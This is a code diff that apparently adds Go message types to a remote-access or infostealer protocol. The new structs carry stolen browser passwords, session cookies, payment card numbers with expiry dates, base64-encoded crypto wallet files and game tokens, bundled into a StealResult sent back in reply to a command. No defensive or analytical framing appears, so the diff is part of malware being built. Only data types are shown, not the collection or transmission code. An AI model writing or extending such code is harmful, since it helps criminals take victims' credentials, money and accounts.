@@ -273,3 +273,72 @@ type DisconnectInfo struct {
 	Reason string `msgpack:"reason"`           // "normal", "panic", "crash", "network", "timeout"
 	Detail string `msgpack:"detail,omitempty"` // error message
 }
+
+type CleanupResult struct {
+	Type      string   `msgpack:"type"`
+	CommandID string   `msgpack:"commandId,omitempty"`
+	OK        bool     `msgpack:"ok"`
+	Cleared   []string `msgpack:"cleared,omitempty"`
+	Errors    []string `msgpack:"errors,omitempty"`
+}
+
+type FunResult struct {
+	Type      string `msgpack:"type"`
+	CommandID string `msgpack:"commandId,omitempty"`
+	OK        bool   `msgpack:"ok"`
+	Message   string `msgpack:"message,omitempty"`
+}
+
+type StealCredential struct {
+	Browser  string `msgpack:"browser"`
+	Profile  string `msgpack:"profile"`
+	URL      string `msgpack:"url"`
+	Username string `msgpack:"username"`
+	Password string `msgpack:"password"`
+}
+
+type StealCookie struct {
+	Browser  string `msgpack:"browser"`
+	Profile  string `msgpack:"profile"`
+	Host     string `msgpack:"host"`
+	Name     string `msgpack:"name"`
+	Value    string `msgpack:"value"`
+	Path     string `msgpack:"path"`
+	IsSecure bool   `msgpack:"isSecure"`
+}
+
+type StealCard struct {
+	Browser     string `msgpack:"browser"`
+	Profile     string `msgpack:"profile"`
+	Name        string `msgpack:"name"`
+	Number      string `msgpack:"number"`
+	ExpiryMonth string `msgpack:"expiryMonth"`
+	ExpiryYear  string `msgpack:"expiryYear"`
+}
+
+type StealWallet struct {
+	Wallet   string `msgpack:"wallet"`
+	Filename string `msgpack:"filename"`
+	DataB64  string `msgpack:"dataB64"`
+}
+
+type StealGameToken struct {
+	Game     string `msgpack:"game"`
+	Type     string `msgpack:"type"`
+	Username string `msgpack:"username"`
+	Value    string `msgpack:"value"`
+}
+
+type StealResult struct {
+	Type        string            `msgpack:"type"`
+	CommandID   string            `msgpack:"commandId,omitempty"`
+	OK          bool              `msgpack:"ok"`
+	Message     string            `msgpack:"message,omitempty"`
+	Credentials []StealCredential `msgpack:"credentials,omitempty"`
+	Cookies     []StealCookie     `msgpack:"cookies,omitempty"`
+	Cards       []StealCard       `msgpack:"cards,omitempty"`
+	Tokens      []string          `msgpack:"tokens,omitempty"`
+	Wallets     []StealWallet     `msgpack:"wallets,omitempty"`
+	GameTokens  []StealGameToken  `msgpack:"gameTokens,omitempty"`
+	Errors      []string          `msgpack:"errors,omitempty"`
+}
